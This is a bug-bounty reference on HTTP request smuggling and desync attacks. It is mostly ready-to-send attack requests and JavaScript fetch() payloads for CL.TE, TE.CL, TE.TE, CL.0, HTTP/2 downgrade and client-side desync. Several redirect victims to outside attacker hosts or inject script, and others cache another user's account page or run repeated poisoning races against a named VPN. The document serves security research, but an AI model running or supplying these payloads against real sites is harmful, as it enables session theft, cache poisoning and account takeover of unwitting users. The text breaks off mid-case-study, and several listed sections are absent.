# HTTP Request Smuggling & Desync Attacks — Comprehensive Knowledgebase

> **Classification**: Research-Grade Bug Hunting Reference  
> **Coverage**: HTTP/1.1 Classic Smuggling, HTTP/2 Downgrade Desync, Browser-Powered Desync, H2C Smuggling, CL.0, Response Queue Poisoning, Cache Chains, CDN Behaviors, Automation & Recon  
> **Sources**: PortSwigger Research (Kettle et al.), HackTricks, PayloadsAllTheThings, Nuclei Templates, Real-World BBP Case Studies  
> **Last Updated**: 2026

---

## Table of Contents

1. [Basics](#basics)
2. [HTTP Request Smuggling Theory](#http-request-smuggling-theory)
3. [Front-End / Back-End Desync](#front-end--back-end-desync)
4. [CL.TE Payloads](#clte-payloads)
5. [TE.CL Payloads](#tecl-payloads)
6. [TE.TE Payloads](#tete-payloads)
7. [CL.0 Attacks](#cl0-attacks)
8. [HTTP/2 Smuggling](#http2-smuggling)
9. [H2C Smuggling](#h2c-smuggling)
10. [Browser-Powered Desync Attacks](#browser-powered-desync-attacks)
11. [Chunked Encoding Tricks](#chunked-encoding-tricks)
12. [Header Confusion Payloads](#header-confusion-payloads)
13. [Response Queue Poisoning](#response-queue-poisoning)
14. [Cache Poisoning + Request Smuggling Chains](#cache-poisoning--request-smuggling-chains)
15. [OAuth Exploitation Chains](#oauth-exploitation-chains)
16. [CSP Bypass Chains](#csp-bypass-chains)
17. [Parser Confusion Payloads](#parser-confusion-payloads)
18. [CDN-Specific Behaviors](#cdn-specific-behaviors)
19. [Browser Quirks](#browser-quirks)
20. [Gadget Chains](#gadget-chains)
21. [Real World Case Studies](#real-world-case-studies)
22. [Fuzzing Payloads](#fuzzing-payloads)
23. [Automation Workflows](#automation-workflows)
24. [Recon Methodology](#recon-methodology)
25. [Nuclei Templates](#nuclei-templates)
26. [Tools and Scanners](#tools-and-scanners)
27. [Advanced Research](#advanced-research)
28. [Bug Bounty Writeups](#bug-bounty-writeups)
29. [Payload Collections](#payload-collections)
30. [WAF Bypasses](#waf-bypasses)
31. [Detection Techniques](#detection-techniques)
32. [References](#references)

---

## Basics

### What is HTTP Request Smuggling?

HTTP request smuggling is a technique for interfering with the way a website processes sequences of HTTP requests received from one or more users. It arises when **front-end** (reverse proxy, load balancer, CDN) and **back-end** servers disagree about where one request ends and the next begins.

Modern web applications frequently employ chains of HTTP servers. The front-end forwards multiple requests over the same back-end TCP connection for efficiency. If the two systems disagree about request boundaries, an attacker can send an **ambiguous request** that gets interpreted differently by each layer. The attacker causes part of their front-end request to be interpreted by the back-end as the start of the next request — effectively **prepending** malicious content to the next user's request.

### Why It Matters

- Bypass front-end security controls (WAFs, auth, rate limiting)
- Gain unauthorized access to internal APIs and admin panels
- Steal session tokens and credentials from other users
- Poison web caches to persistently serve malicious content
- Compromise other application users with XSS, open redirects, and JS hijacking
- Full account takeover and site-wide compromise in severe cases

### Root Cause

HTTP/1.1 provides **two different ways** to specify where a request ends:

1. **Content-Length (CL)**: Specifies the length of the message body in bytes.
2. **Transfer-Encoding: chunked (TE)**: The body consists of chunks; each chunk has a size prefix (hex) followed by data, terminated by a zero-length chunk.

RFC 2616 states: *If a message is received with both Transfer-Encoding and Content-Length, the latter MUST be ignored.* However, not all servers obey this, and not all servers support Transfer-Encoding in requests. When two servers are chained, discrepancies in handling these headers create smuggling opportunities.

### Attack Classes

| Class | Front-End Uses | Back-End Uses | Notes |
|-------|---------------|---------------|-------|
| **CL.TE** | Content-Length | Transfer-Encoding | Classic; front-end forwards body, back-end parses chunks |
| **TE.CL** | Transfer-Encoding | Content-Length | Front-end parses chunks, back-end uses CL |
| **TE.TE** | Transfer-Encoding | Transfer-Encoding | One server is tricked into ignoring TE via obfuscation |
| **H2.CL** | HTTP/2 length | Content-Length | HTTP/2 downgrading; front-end uses built-in length |
| **H2.TE** | HTTP/2 length | Transfer-Encoding | Front-end ignores TE, back-end honors it after downgrade |
| **CL.0** | Content-Length | Ignores body (treats as 0) | Back-end ignores CL entirely; browser-compatible |
| **H2.0** | HTTP/2 length | Ignores body | HTTP/2 variant of CL.0 |
| **0.CL** | Ignores CL | Content-Length | Front-end ignores CL; historically considered unexploitable |

---

## HTTP Request Smuggling Theory

### Connection Reuse & Request Boundaries

HTTP/1.1 allows multiple requests over a single TCP/TLS connection. The protocol is simple: requests are placed back-to-back, and the server parses headers to determine where each message ends and the next begins.

When the front-end and back-end **agree** on boundaries, the system is safe. When they **disagree**, an attacker can inject a prefix that the back-end interprets as the beginning of the next request.

### The Prefix Concept

Throughout PortSwigger research, the smuggled content is referred to as the **prefix** (highlighted in orange in diagrams). The attacker's goal is to:

1. Craft a request where the front-end sees it as one complete request.
2. The back-end sees the same bytes as one request + the start of a second request.
3. The second request's start (the prefix) is prepended to the next legitimate user's request.

### Dual Content-Length (Historical)

Early research (Watchfire, 2005) used multiple Content-Length headers. This rarely works today because most systems reject requests with duplicate CL headers. Modern attacks primarily use **chunked encoding** because RFC compliance implicitly allows both CL and TE to coexist, with TE taking precedence — but only if both servers see it.

### Chunked Encoding in Requests

Many testers are unaware that chunked encoding can be used in HTTP **requests** because:
- Burp Suite automatically unpacks chunked encoding for viewing/editing.
- Browsers do not normally use chunked encoding in requests.

Chunk format:
```
<hex-size>\r\n
<data>\r\n
<hex-size>\r\n
<data>\r\n
0\r\n
\r\n
```

---

## Front-End / Back-End Desync

### Connection-Locked Desync

Some front-ends create a fresh back-end connection for each client connection (connection-locking). This prevents cross-user attacks but still enables:
- **Request tunnelling**: Smuggling a complete request to the back-end and reading the response.
- **Self-poisoning**: The attacker poisons their own connection to access internal headers or bypass front-end rules.

### First-Request Validation & Routing

Some proxies only apply Host whitelisting or routing decisions to the **first request** on a connection. Subsequent requests may be routed to arbitrary back-ends or bypass access controls.

**First-request validation bypass:**
```http
GET / HTTP/1.1
Host: allowed.com
GET / HTTP/1.1
Host: internal.allowed.com
```

**First-request routing abuse:**
```http
GET / HTTP/1.1
Host: example.com
POST /pwreset HTTP/1.1
Host: attacker.com
```

### Header Rewriting Discrepancies

Front-ends typically append internal headers (X-Forwarded-For, X-Forwarded-Proto, custom auth headers). Smuggled requests bypass the front-end entirely and may miss these headers, causing:
- Authentication failures on the back-end.
- Routing to incorrect virtual hosts.
- Missing security context.

**Revealing front-end rewriting** (reflection technique):
1. Find a POST endpoint that reflects a parameter.
2. Position the reflected parameter last in the body.
3. Smuggle the request with an overlong Content-Length.
4. The next request gets appended into the reflected parameter, leaking all front-end injected headers.

---

## CL.TE Payloads

> **Definition**: Front-end uses Content-Length. Back-end uses Transfer-Encoding: chunked.

### Basic CL.TE

The front-end processes Content-Length: 13 and forwards up to the end of SMUGGLED. The back-end processes Transfer-Encoding: chunked, sees the 0 terminator, and treats SMUGGLED as the start of the next request.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### CL.TE with Body Prefix

```http
POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Transfer-Encoding: zchunked

17
=x&q=smuggling&x=
0
GET /404 HTTP/1.1
Foo: b
```

**Research note**: The zchunked obfuscation tricks the front-end into ignoring TE, making it fall back to CL. The back-end still parses TE. This is technically a TE.TE variant that resolves to CL.TE behavior.

### CL.TE Detection (Timeout-Based)

Safe detection without harming other users:
```http
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 41

Z
Q
```

- Front-end forwards blue text only (41 bytes).
- Back-end waits for next chunk size (after Z); times out.
- Observable delay = potential CL.TE vulnerability.

### CL.TE Socket Poisoning Confirmation

```http
POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Transfer-Encoding: zchunked

17
=x&q=smuggling&x=
0
GET /404 HTTP/1.1
Foo: b
```

Follow with a normal victim request. If the victim gets a 404, the socket is poisoned.

---

## TE.CL Payloads

> **Definition**: Front-end uses Transfer-Encoding: chunked. Back-end uses Content-Length.

### Basic TE.CL

The front-end parses chunks: first chunk is 8 bytes (SMUGGLED), second chunk is 0 (terminator). It forwards the entire request. The back-end uses Content-Length: 3, reads only up to the newline after 8, and treats the remaining bytes (starting with SMUGGLED) as the next request.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

**Critical**: To send this in Burp Repeater, uncheck **Update Content-Length**. You must include the trailing \r\n\r\n after the final 0.

### TE.CL with Calculated Chunk Size

```http
POST / HTTP/1.1
Host: domain.example.com
User-Agent: Mozilla/5.0
Content-Length: 4
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0

```

**Note**: 5c (92 in decimal) must match the length of the following chunk data including newlines. Manual calculation is error-prone — tools like HTTP Request Smuggler automate this.

### TE.CL Detection (Timeout-Based)

```http
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 60

0

X
```

- Front-end parses chunked: 0 chunk -> request complete -> forwards blue text only.
- Back-end reads 60 bytes, gets 0\r\n\r\nX -> times out waiting for remaining bytes.

### TE.CL Socket Poisoning Confirmation

```http
POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: zchunked

96
GET /404 HTTP/1.1
X: x=1&q=smugging&x=
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
x=
0

POST /search HTTP/1.1
Host: example.com
```

The Content-Length: 100 in the smuggled prefix is slightly larger than the body. The victim's request gets appended but truncated before its headers, avoiding duplicate header errors.

---

## TE.TE Payloads

> **Definition**: Both servers support Transfer-Encoding, but one can be induced to ignore it via obfuscation.

### TE.TE Obfuscation Techniques

Each of these has successfully exploited at least one real-world system:

```http
Transfer-Encoding: xchunked
```

```http
Transfer-Encoding : chunked
```

```http
Transfer-Encoding: chunked
Transfer-Encoding: x
```

```http
Transfer-Encoding:[tab]chunked
```

```http
[space]Transfer-Encoding: chunked
```

```http
X: X[\n]Transfer-Encoding: chunked
```

```http
Transfer-Encoding
: chunked
```

```http
Transfer-Encoding: cow
```

```http
Transfer-Encoding: \x00chunked
```

```http
Transfer-Encoding: chun\x00ked
```

### Research Notes on TE.TE

- Real-world HTTP parsers rarely adhere to specifications with absolute precision.
- Different implementations tolerate different variations.
- To uncover TE.TE, find a variation that **only one** of the front-end or back-end processes.
- Depending on which server ignores the obfuscated header, the attack resolves to either **CL.TE** or **TE.CL** behavior.

### TE.TE via Header Name Variations

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: xchunked

0

GPOST / HTTP/1.1
Host: example.com
```

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked
Transfer-Encoding: x

0

GPOST / HTTP/1.1
Host: example.com
```

---

## CL.0 Attacks

> **Definition**: The back-end server ignores the Content-Length header entirely, treating the request body as the start of the next request. Equivalent to treating CL as 0. Browser-compatible.

### Basic CL.0 / H2.0

```http
POST / HTTP/1.1
Host: redacted
Content-Length: 3

xyzGET / HTTP/1.1
Host: redacted
```

The front-end uses CL (forwards 3 bytes of body). The back-end ignores CL, so xyzGET / HTTP/1.1... is interpreted as the method of the next request. The xyz corrupts the method, but the **next** request on the connection gets prepended with GET / HTTP/1.1....

### CL.0 on Static Files / Redirects

Back-ends often ignore CL on endpoints that don't expect POST requests (static files, server-level redirects):

```http
POST /favicon.ico HTTP/1.1
Host: example.com
Content-Length: 23

GET /404 HTTP/1.1
X: Y
```

### Amazon.com H2.0 Case Study

```http
POST /b/ HTTP/2
Host: www.amazon.com
Content-Length: 23

GET /404 HTTP/1.1
X: X
```

Amazon ignored the CL on requests to /b/. A PoC stored live users' complete requests (including authentication tokens) in the attacker's shopping list by smuggling a request to the add to list endpoint.

### CL.0 Detection Methodology

1. Send a POST request with an overlong Content-Length to an endpoint that normally accepts GET (static file, redirect, 404 page).
2. If the server responds without waiting for the full body, it may be ignoring CL.
3. To confirm: send two requests down the same connection. Make the first request's body start with GET /404 HTTP/1.1. If the second response is a 404, the back-end is ignoring CL.

```http
POST /favicon.ico HTTP/1.1
Host: example.com
Content-Length: 23

GET /404 HTTP/1.1
X: Y

GET / HTTP/1.1
Host: example.com
```

### CL.0 Browser-Powered Exploitation

Because CL.0 uses completely valid, specification-compliant HTTP/1 requests, it can be triggered by a browser via fetch():

```javascript
fetch('https://www.example.com/favicon.ico', {
    method: 'POST',
    body: "GET /404 HTTP/1.1\r\nX: Y",
    mode: 'no-cors',
    credentials: 'include'
});
```

---

## HTTP/2 Smuggling

> **Core Concept**: HTTP/2 has a built-in length mechanism (frame lengths), but when downgraded to HTTP/1.1 for the back-end, the front-end must synthesize CL or TE headers. Discrepancies between HTTP/2's implicit length and the downgraded HTTP/1 headers create desync.

### HTTP/2 Downgrading

```
[Client: HTTP/2] ---> [Front-End] ---(rewrite)---> [Back-End: HTTP/1.1]
                              (adds CL/TE headers)
```

HTTP/2 end-to-end is inherently immune to request smuggling. The vulnerability arises almost exclusively from **HTTP/2 downgrading**.

### H2.CL Vulnerabilities

The front-end uses HTTP/2's built-in length. The back-end uses the injected/synthesized Content-Length.

**Netflix case study (CVE-2021-21295):**

HTTP/2 request:
```
:method  POST
:path    /n
:authority www.netflix.com
content-length 4

abcdGET /n HTTP/1.1
Host: 02.rs?x.netflix.com
Foo: bar
```

Downgraded to HTTP/1.1:
```http
POST /n HTTP/1.1
Host: www.netflix.com
Content-Length: 4

abcdGET /n HTTP/1.1
Host: 02.rs?x.netflix.com
Foo: bar
```

The back-end reads only 4 bytes (abcd), and the orange text becomes the prefix of the next request. This enabled redirecting arbitrary users to the attacker's domain, compromising accounts, stealing passwords and credit card numbers.

### H2.TE Vulnerabilities

The front-end ignores transfer-encoding: chunked (HTTP/2 spec says this header should be stripped/blocked). The back-end honors it after downgrade.

**AWS ALB / Verizon case study:**

HTTP/2 request:
```
:method  POST
:path    /identity/XUI
:authority id.b2b.oath.com
transfer-encoding chunked

0
GET /oops HTTP/1.1
Host: psres.net
Content-Length: 10
x=
```

Downgraded:
```http
POST /identity/XUI HTTP/1.1
Host: id.b2b.oath.com
Content-Length: 66
Transfer-Encoding: chunked

0
GET /oops HTTP/1.1
Host: psres.net
Content-Length: 10
x=
```

The front-end (ALB) used HTTP/2 length. The back-end parsed TE chunked and stopped at the 0 chunk. The prefix redirected users to psres.net. During exploitation, live OAuth login flows were intercepted, leaking secret code values via the Referer header.

### H2.TE via Header Injection (CRLF in Header Value)

HTTP/2's binary format allows \r\n inside header values. When downgraded, the \r\n is interpreted as a header delimiter in HTTP/1.1.

**Netlify / Firefox start page case study:**

HTTP/2 request:
```
:method  POST
:path    /
:authority start.mozilla.org
foo      b\r\n
Transfer-Encoding: chunked

0\r\n
\r\n
GET / HTTP/1.1\r\n
Host: evil-netlify-domain\r\n
Content-Length: 5\r\n
\r\n
x=
```

Downgraded result:
```http
POST / HTTP/1.1
Host: start.mozilla.org
Foo: b
Transfer-Encoding: chunked
Content-Length: 71

0

GET / HTTP/1.1
Host: evil-netlify-domain
Content-Length: 5

x=
```

This achieved persistent cache poisoning across the entire Netlify CDN. Every page on every site could be controlled by the attacker.

### H2.X via Request Splitting (Double Request)

Instead of smuggling a prefix, inject a complete second request inside a header. The front-end terminates headers with \r\n\r\n during downgrade, which splits the injected content into a standalone request.

**Atlassian Jira case study (PulseSecure VTM, $15,000):**

HTTP/2 request:
```
:method  GET
:path    /
:authority ecosystem.atlassian.net
foo      bar\r\n\r\n
GET /robots.txt HTTP/1.1\r\n
X-Ignore: x
```

Downgraded:
```http
GET / HTTP/1.1
Foo: bar
Host: ecosystem.atlassian.net

GET /robots.txt HTTP/1.1
X-Ignore: x
Host: ecosystem.atlassian.net
```

The back-end sees **two complete requests**. The front-end sees **one**. This causes **response queue poisoning**: the front-end starts serving each user the response to the previous user's request indefinitely. Some responses contained Set-Cookie headers that persistently logged users into other users' accounts. Atlassian globally expired all sessions.

### H2.TE via Request Line Injection

Inject into the :method pseudo-header:

```
:method  GET / HTTP/1.1
Transfer-encoding: chunked
x: x
:path    /ignored
:authority ecosystem.atlassian.net
```

Downgraded:
```http
GET / HTTP/1.1
transfer-encoding: chunked
x: x /ignored HTTP/1.1
Host: eco.atlassian.net
```

### H2.TE via Header Name Splitting (Colon in Name)

```
:method  POST
:path    /
:authority ecosystem.atlassian.net
transfer-encoding: chunked |
```

Downgraded:
```http
GET / HTTP/1.1
Host: ecosystem.atlassian.net
transfer-encoding: chunked: 
```

### H2.CL via :scheme Abuse (URL Prefix Injection)

Some systems use :scheme to construct URLs without validation:

```
:method  GET
:path    /ffx36.js
:authority start.mozilla.org
:scheme  http://start.mozilla.org/xyz?
```

Result:
```http
HTTP/1.1 301 Moved Permanently
Location: https://start.mozilla.org/xyz?://start.mozilla.org/ffx36.js
```

### H2.CL via Duplicate :path

Some servers accept multiple :path headers and are inconsistent in which they process:

```
:method  GET
:path    /some-path
:path    /different-path
:authority example.com
```

### Hidden HTTP/2 Detection

Some servers support HTTP/2 but fail to advertise it via ALPN. Force HTTP/2:

```bash
curl --http2 --http2-prior-knowledge https://target.com/
```

In Burp: Settings > Repeater > Allow HTTP/2 ALPN override. Then switch Protocol to HTTP/2 in Inspector.

---

## H2C Smuggling

> **H2C** = HTTP/2 Cleartext. The upgrade from HTTP/1.1 to HTTP/2 over a plain TCP connection.

### H2C Upgrade Smuggling

Some front-ends support HTTP/2 for back-end communication but don't properly validate the upgrade. An attacker can send an HTTP/1.1 request with an Upgrade: h2c header to trick the front-end into establishing an HTTP/2 connection to the back-end, then send raw HTTP/2 frames that bypass front-end controls.

### H2C Smuggling Prerequisites

1. The front-end supports HTTP/2 for back-end connections (often via Upgrade: h2c).
2. The front-end forwards the Upgrade header or attempts to upgrade based on client requests.
3. The back-end supports HTTP/2 cleartext.

### H2C Payload Structure

```http
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
```

Followed immediately by HTTP/2 frames (raw binary). The front-end may upgrade the back-end connection to HTTP/2, allowing the attacker to send HTTP/2 frames that the front-end doesn't inspect.

### Tools for H2C

- **h2csmuggler** (BishopFox): Automates H2C smuggling detection and exploitation.
- **http2smugl**: HTTP/2 smuggling testing tool.

### H2C vs HTTP/2 Downgrade

| H2C Smuggling | HTTP/2 Downgrade |
|---------------|------------------|
| Upgrades HTTP/1 -> HTTP/2 on back-end | Downgrades HTTP/2 -> HTTP/1 on back-end |
| Bypasses front-end by speaking HTTP/2 to back-end | Exploits translation errors |
| Often used to bypass WAFs/path restrictions | Used for desync attacks |

---

## Browser-Powered Desync Attacks

> **Browser-Powered Desync** = Attacks that can be triggered via a web browser using fully browser-compatible requests. Includes Client-Side Desync (CSD) and some server-side desyncs.

### Client-Side Desync (CSD)

Traditional request smuggling poisons the front-end/back-end connection. **CSD poisons the browser's own connection pool** to the vulnerable server. This enables:
- Attacking **single-server sites** (no front-end/back-end architecture).
- Attacking **intranet sites** the attacker cannot access directly.
- Using the victim's browser as a desync delivery platform.

### CSD Attack Flow

```
1. Victim visits attacker.com
2. attacker.com uses fetch() to send POST request to victim.com with malicious body
3. victim.com ignores CL (treats body as next request)
4. Browser reuses connection for navigation to victim.com
5. Browser's GET request gets prepended with attacker's prefix
6. Harmful response executes in victim's browser on victim.com origin
```

### CSD Requirements

1. **Server ignores CL**: Typically because the endpoint doesn't expect POST (static files, redirects, error pages).
2. **Browser-compatible request**: Must be triggerable cross-domain via fetch().
3. **HTTP/1.1 connection reuse**: Browsers prefer HTTP/2; if target supports HTTP/2, CSD usually fails unless a forward proxy forces HTTP/1.1.

### CSD Detection

Step 1 — Overlong CL test:
```http
POST /favicon.ico HTTP/1.1
Host: example.com
Content-Length: 5

X
```

If server responds without waiting for body, promising.

Step 2 — Two-request confirmation:
```http
POST /favicon.ico HTTP/1.1
Host: example.com
Content-Length: 23

GET /404 HTTP/1.1
X: Y

GET / HTTP/1.1
Host: example.com
```

If second response is 404, CSD vector confirmed.

### CSD Browser Confirmation (JavaScript)

```javascript
fetch('https://example.com/favicon.ico', {
    method: 'POST',
    body: "GET /hopefully404 HTTP/1.1\r\nX: Y",
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://example.com/'
});
```

In Chrome DevTools Network tab: look for two requests with the same **Connection ID**, where the second triggers a 404.

### CSD Exploitation: HEAD Stacking

Use HEAD to combine headers with a later body response. The HEAD response has Content-Length but no body, so the browser interprets the next response's headers+body as the body of the HEAD response.

**Akamai / Capital One case study:**

```javascript
fetch('https://www.capitalone.ca/assets', {
    method: 'POST',
    body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\nHost: www.capitalone.ca\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
    credentials: 'include',
    mode: 'cors'  // throws CORS error, prevents redirect follow
}).catch(() => {
    location = 'https://www.capitalone.ca/'
});
```

**Why mode: 'cors'?** The initial request triggers a 301 redirect. If followed, the browser discards the connection. CORS error prevents redirect following. The catch() block then navigates to the target, reusing the poisoned connection.

**Stacked-response problem**: Browsers discard connections if they receive more data than expected. Mitigate by delaying the 404 response (cache-buster parameter causing cache miss + ~500ms delay).

### CSD Exploitation: Host-Header Redirect Gadget

If the server reflects the Host header in redirects (Apache/IIS default behavior):

```http
POST /etc/libs/xyz.js HTTP/1.1
Host: redacted
Content-Length: 57
Transfer-Encoding: chunked

0
POST /etc HTTP/1.1
Host: burpcollaborator.net
X: X
```

Browser receives:
```http
HTTP/1.1 301 Moved Permanently
Location: https://burpcollaborator.net/etc/
```

For CSD in browser:
```javascript
fetch('https://vpn.redacted/robots.txt', {
    method: 'POST',
    body: 'GET /xdana-na/imgs/footerbg.gif HTTP/1.1\r\nHost: x.psres.net\r\nFoo: ' + 'a'.repeat(9826) + '\r\nConnection: keep-alive\r\n\r\n',
    mode: 'no-cors',
    credentials: 'include'
});
```

### CSD: Client-Side Cache Poisoning

If redirect gadget isn't cacheable, poison the **browser's local cache** instead of the server-side cache:

1. Poison socket with redirect to attacker domain.
2. Navigate browser directly to JS resource (e.g., /+CSCOE+/win.js).
3. Browser caches the redirect for that JS URL.
4. When login page loads and requests the JS, browser serves cached redirect.
5. Attacker serves malicious JS polyglot.

**Cisco Web VPN case study (CVE-2022-20713):**

```javascript
fetch('https://redacted/', {
    method: 'POST',
    body: "GET /+webvpn+/ HTTP/1.1\r\nHost: x.psres.net\r\nX: Y",
    credentials: 'include'
}).catch(() => {
    location = 'https://redacted/+CSCOE+/win.js'
});
```

Attacker serves JS/HTML polyglot:
```http
HTTP/1.1 200 OK
Content-Type: text/html

alert('oh dear')/*<script>location='https://redacted/+CSCOE+/logon.html'</script>*/
```

### CSD: Fragmented Chunk Technique

For servers that send chunked responses to HEAD requests unless TE: chunked is explicitly present:

```http
POST /%2f HTTP/1.1
Host: www.verisign.com
Content-Length: 81

HEAD / HTTP/1.1
Connection: keep-alive
Transfer-Encoding: chunked

34d
x
```

The attacker predicts the exact size of the browser's next request and consumes it in a single chunk.

### CSD: Multi-Attempt Race Conditioning

For unreliable attacks, engineer multiple attempts:

```javascript
function reset() {
    fetch('https://vpn.redacted/robots.txt', {mode: 'no-cors', credentials: 'include'})
    .then(() => {
        x.location = "https://vpn.redacted/dana-na/meeting/meeting_testjs.cgi?cb="+Date.now()
    });
    setTimeout(poison, 120);
}

function poison() {
    sendPoison(); sendPoison(); sendPoison();
    setTimeout(reset, 1000);
}

function sendPoison() {
    fetch('https://vpn.redacted/dana-na/css/ds_1234.css', {
        method: 'POST',
        body: 'GET /xdana-na/imgs/footerbg.gif HTTP/1.1\r\nHost: x.psres.net\r\nFoo: ' + 'a'.repeat(9826) + '\r\nConnection: keep-alive\r\n\r\n',
        mode: 'no-cors',
        credentials: 'include'
    });
}
```

---

## Chunked Encoding Tricks

### Chunk Size Format Edge Cases

Chunk sizes are in **hexadecimal**. Valid prefixes that may confuse parsers:

```
0
00
000
0x0
0

0;comment
0;ext=value
```

### Chunk Extensions

RFC allows semicolon-delimited extensions after the chunk size:

```
5;ext=val

hello

0;ext=val



```

Some parsers fail to handle extensions correctly, treating the extension as part of the size or data.

### Line-Folding in Chunked Parsing

Deprecated HTTP/1.1 feature where `
[space]` continues a header line. If a back-end supports line-folding but the front-end doesn't, this can be used to hide headers:

```http
Transfer-Encoding: chun
 ked
```

### Chunked + Content-Length Combinations

```http
Content-Length: 6
Transfer-Encoding: chunked

0


GPOST / HTTP/1.1
```

The `0

` terminates chunked encoding. The `G` starts the next request's method.

### Overlong Chunk Size

If the chunk size claims more bytes than actually sent, the back-end hangs waiting for data. This is the basis of **timeout-based detection**.

### Terminating Chunk Variations

```
0

          # Standard
0

              # LF-only (some servers accept)
00000000

   # Padded zero
0;

         # Empty extension
```

---

## Header Confusion Payloads

### Connection Header Abuse

The `Connection` header controls connection persistence. In HTTP/2, connection-specific headers (including `Connection`, `Keep-Alive`, `Transfer-Encoding`) should be stripped. If not, they can be injected into the downgraded request.

```http
Connection: keep-alive, Transfer-Encoding
```

Some front-ends parse `Connection` as a comma-separated list and may mishandle it.

### Hop-by-Hop Header Abuse

Headers listed in `Connection: header-name` are treated as hop-by-hop and should be stripped by proxies. If a front-end strips a header that the back-end needs (or vice versa), behavior changes:

```http
Connection: close, Content-Length
```

### Duplicate Header Handling

| Server | Behavior with Duplicate CL | Behavior with Duplicate TE |
|--------|---------------------------|---------------------------|
| Apache | Rejects | Uses first |
| Nginx | Rejects | Uses first |
| IIS | Rejects | Uses first |
| F5 BIG-IP | Varies | Varies |
| Akamai | Fixed (was vulnerable) | Fixed |

### Header Case Sensitivity

HTTP/2 mandates lowercase headers. HTTP/1.1 is case-insensitive. Downgrading may normalize case, but some back-ends are case-sensitive for non-standard headers:

```http
x-ssl-client-cn: administrator
X-SSL-CLIENT-CN: administrator
```

### Header Ordering Attacks

HTTP/2 preserves header order. During downgrade, some front-ends append the `Host` header at the end. If a request is split via CRLF injection, the injected `Host` may end up in the wrong request:

```
foo: bar


GET /admin HTTP/1.1

Host: victim.com
```

If front-end appends `Host` after `foo`, the first request lacks a `Host` header entirely. Fix by positioning the injected `Host` before the split point:

```
foo: bar

Host: victim.com


GET /admin HTTP/1.1
```

---

## Response Queue Poisoning

### What is Response Queue Poisoning?

A powerful attack where the attacker causes the front-end to serve **responses to the wrong requests**. Instead of smuggling a prefix, the attacker smuggles an **entire complete request**, causing the back-end to emit two responses for one front-end request. The front-end then serves the first response to the attacker, and the **second response to the next user**.

If the attacker smuggles continuously, the front-end serves each user the response to the **previous** user's request indefinitely.

```
Attacker: Req1 (contains smuggled Req2)
Back-end: Resp1 (to Req1), Resp2 (to Req2)
Front-end gives Resp1 to Attacker

User A sends Req3
Front-end gives Resp2 to User A  <-- WRONG RESPONSE
Back-end generates Resp3

User B sends Req4
Front-end gives Resp3 to User B  <-- WRONG RESPONSE
```

### Jira Case Study

HTTP/2 request splitting caused Atlassian Jira to serve users responses intended for other users. Some responses contained `Set-Cookie` headers, logging users into other accounts.

### Response Queue Poisoning via HTTP/2 Request Splitting

```
:method  GET
:path    /
:authority ecosystem.atlassian.net
foo      bar


GET /robots.txt HTTP/1.1

X-Ignore: x
```

The front-end adds `

` after the last header during downgrade. If the injected header already contains `

`, the front-end's terminator creates a complete second request.

### Detection

Smuggle exactly two requests and observe if you receive the response to the second request immediately after the first. In HTTP/2, if you see HTTP/1 headers in an HTTP/2 response body, you've found response queue poisoning or tunnelling.

### Impact Mitigation

- If you find request smuggling and need to prove impact without harming users, smuggling exactly two requests is safer than continuous prefix injection.
- However, on live sites, any response queue poisoning will affect real users. Target staging servers.

---

## Cache Poisoning + Request Smuggling Chains

### Web Cache Poisoning via Request Smuggling

The attacker smuggles a request that triggers a harmful response (e.g., open redirect, XSS). The next user's request hits the poisoned socket, receives the harmful response, and the **cache stores it** against the victim's URL.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 59
Transfer-Encoding: chunked

0
GET /home HTTP/1.1
Host: attacker-website.com
Foo: X

GET /static/include.js HTTP/1.1
Host: vulnerable-website.com
```

The back-end responds to the smuggled `GET /home` with a 301 redirect to `attacker-website.com`. This response gets cached against `/static/include.js`. All subsequent users requesting the JS file get redirected to the attacker.

### Web Cache Deception++

Instead of poisoning with malicious content, force the cache to store **sensitive user-specific content**:

```http
POST / HTTP/1.1
Transfer-Encoding: blah

0
GET /account/settings HTTP/1.1
X: X

GET /static/site.js HTTP/1.1
Cookie: sessionid=xyz
```

The victim's request for `/static/site.js` hits the poisoned socket. The back-end processes `GET /account/settings` with the victim's cookies, returns their payment history. The front-end caches this against `/static/site.js`. The attacker then fetches the static URL and receives the victim's data.

**Advantages over classic Web Cache Deception:**
- No user interaction required.
- Doesn't rely on the target site allowing extension manipulation.

### CDN Chaining

Multiple layers of reverse proxies/CDNs create extra desync opportunities. If two layers of Akamai are used, desync between them allowed serving content from anywhere on the Akamai network on the victim's domain.

```http
POST /cow.jpg HTTP/1.1
Host: redacted.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Transfer-Encoding: chunked

0
GET / HTTP/1.1
Host: www.redhat.com
X: X
```

### PayPal Case Study

Request smuggling + cache poisoning persistently hijacked JavaScript files on PayPal's login page. The attack chain:

1. Poison `https://c.paypal.com/webstatic/r/fb/fb-all-prod.pp2.min.js` with a redirect.
2. PayPal's login page CSP blocked the redirect.
3. However, a dynamically generated iframe sub-page on `c.paypal.com` had **no CSP** and imported the poisoned JS.
4. Controlled the iframe but couldn't read parent password due to SOP.
5. Found `paypal.com/us/gifts` also had no CSP and imported the poisoned JS.
